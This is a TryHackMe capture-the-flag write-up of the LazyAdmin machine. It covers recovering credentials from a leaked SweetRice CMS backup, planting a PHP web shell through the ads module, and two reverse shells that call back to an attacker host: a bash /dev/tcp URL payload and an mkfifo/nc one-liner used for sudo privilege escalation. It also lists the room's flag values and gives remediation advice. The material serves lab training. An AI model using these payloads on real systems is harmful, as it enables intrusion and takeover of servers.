 # LazyAdmin — TryHackMe Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Easy%2FMedium-brightgreen)
![Category](https://img.shields.io/badge/Category-Linux%20|%20CMS%20|%20Sudo%20Abuse-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Author:** Miraç Akkuş (LatenT)  
> **Date:** May 2026  
> **Room:** [LazyAdmin](https://tryhackme.com/room/lazyadmin)

---

## 📋 Executive Summary

This writeup documents the compromise of the **LazyAdmin** machine, demonstrating exploitation of a misconfigured SweetRice CMS backup leak leading to credential recovery, followed by authenticated remote code execution via the CMS ads module, and culminating in privilege escalation through a writable script called by a sudo-authorized Perl script.

---

## 🛠️ Tools & Technologies

| Tool | Purpose |
|------|---------|
| `nmap` | Network reconnaissance |
| `gobuster` | Directory enumeration |
| `john` | Password hash cracking |
| `nc` | Reverse shell listener |

---

## 🔍 Phase 1: Reconnaissance & Enumeration

### Network Scanning

```bash
nmap -sV -sC -T4 <TARGET_IP>
```

### Findings

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | open | SSH | OpenSSH |
| 80/tcp | open | HTTP | Apache |

### Directory Enumeration

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Discovered Directories:**

| Directory | Contents | Significance |
|-----------|----------|--------------|
| `/content` | SweetRice CMS | Primary web application |
| `/content/inc` | Configuration files | Contains backups |
| `/content/backup` | MySQL backup | Credential leak |

---

## 🌐 Phase 2: Credential Recovery

### MySQL Backup Discovery

```bash
wget http://<TARGET_IP>/content/inc/mysql_backup/mysql_bakup_20191129023059.sql
```

### Backup Analysis

Extracted credentials:
- **Username:** `manager`
- **Password Hash:** `42f749ade7f9e195bf475f37a44cafcb`

### Hash Cracking

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Result:** `Password123`

---

## 🎯 Phase 3: SweetRice CMS Exploitation

### Admin Panel Access

```bash
http://<TARGET_IP>/content/as/
```

**Login:** `manager / Password123`

### Authenticated RCE via Ads Module

SweetRice 1.5.1 allows PHP code execution through the Ads management interface.

**Payload Injection:**
```php
<?php system($_GET['cmd']); ?>
```

**Execution URL:**
```bash
http://<TARGET_IP>/content/inc/ads/hacked.php?cmd=whoami
```

### Reverse Shell

**Listener:**
```bash
nc -lvnp 4444
```

**Payload:**
```bash
http://<TARGET_IP>/content/inc/ads/hacked.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/<ATTACKER_IP>/4444%200%3E%261%27
```

**Result:** Shell obtained as `www-data`

---

## 🏴 Phase 4: User Flag

```bash
cat /home/itguy/user.txt
```

**User Flag:** `THM{63e5bce9271952aad1113b6f1ac28a07}`

---

## 🚀 Phase 5: Privilege Escalation

### Sudo Privilege Analysis

```bash
sudo -l
```

**Finding:**
```
User www-data may run the following commands on lazyadmin:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

### Script Analysis

```bash
cat /home/itguy/backup.pl
```

**Content:**
```perl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

**Vulnerability:** `backup.pl` executes `/etc/copy.sh` which is writable by `www-data`.

### Exploitation Chain

**Step 1:** Overwrite `/etc/copy.sh` with reverse shell:

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 5554 > /tmp/f' > /etc/copy.sh
```

**Step 2:** Start listener:

```bash
nc -lvnp 5554
```

**Step 3:** Execute sudo command:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

**Result:** Root shell obtained.

---

## 🏁 Phase 6: Root Flag

```bash
cat /root/root.txt
```

**Root Flag:** `THM{6637f41d0177b6f37cb20d775124699f}`

---

## 🗺️ Attack Path Visualization

```
[Attacker]
    │
    ├───nmap───► [Target: 22, 80]
    │                │
    │                ▼
    │        [gobuster: /content, /content/inc, /content/backup]
    │                │
    │                ▼
    │        [MySQL backup download]
    │                │
    │                ▼
    │        [Hash extraction: manager:42f749...]
    │                │
    │                ▼
    │        [john: Password123]
    │                │
    │                ▼
    │        [SweetRice admin panel]
    │                │
    │                ▼
    │        [Ads module PHP RCE]
    │                │
    │                ▼
    │        [www-data shell]
    │                │
    │                ▼
    │        [User Flag]
    │                │
    │                ▼
    │        [sudo -l: perl backup.pl]
    │                │
    │                ▼
    │        [backup.pl → /etc/copy.sh]
    │                │
    │                ▼
    │        [Overwrite copy.sh with reverse shell]
    │                │
    │                ▼
    │        [sudo perl backup.pl]
    │                │
    │                ▼
    └────────► [Root shell + Flag]
```

---

## 🛡️ Vulnerability Assessment & Remediation

| # | Vulnerability | Severity | CVSS | Remediation |
|---|--------------|----------|------|-------------|
| 1 | **MySQL Backup Exposure** | 🔴 Critical | 9.0 | Remove backup files from web root; restrict directory listing; implement access controls |
| 2 | **Weak MD5 Password Hash** | 🔴 Critical | 9.8 | Use bcrypt/Argon2; enforce strong password policies; implement MFA |
| 3 | **SweetRice Ads RCE** | 🔴 Critical | 9.8 | Update CMS; sanitize ad content; disable PHP execution in user input |
| 4 | **Writable Script in Sudo Chain** | 🔴 Critical | 9.0 | Restrict `/etc/copy.sh` permissions; validate script integrity; use absolute paths with checksums |
| 5 | **Unrestricted Sudo Perl** | 🟠 High | 7.8 | Limit sudo to specific scripts; remove NOPASSWD; implement command logging |

---

## 🎓 Key Takeaways

1. **Backup Files:** Always check `/backup`, `/inc`, `/config` directories — credentials leak frequently
2. **MD5 is Broken:** Rainbow tables crack MD5 in seconds — never use for password storage
3. **CMS Ads Modules:** Often allow arbitrary code execution — treat as critical attack surface
4. **Sudo Chain Analysis:** `sudo -l` reveals the full execution chain — trace every called script
5. **Writable Intermediate Scripts:** Even if you can't modify the sudo target, check what it calls

---
---

## 🚩 Flags

| Flag | Location | Value |
|------|----------|-------|
| **User Flag** | `/home/itguy/user.txt` | `THM{63e5bce9271952aad1113b6f1ac28a07}` |
| **Root Flag** | `/root/root.txt` | `THM{6637f41d0177b6f37cb20d775124699f}` |

---

> **⚠️ Legal Disclaimer:** This writeup is for educational and research purposes only. Always obtain explicit written authorization before testing systems you do not own.

---

**Author:** Miraç Akkuş (LatenT)  
**Date:** May 2026
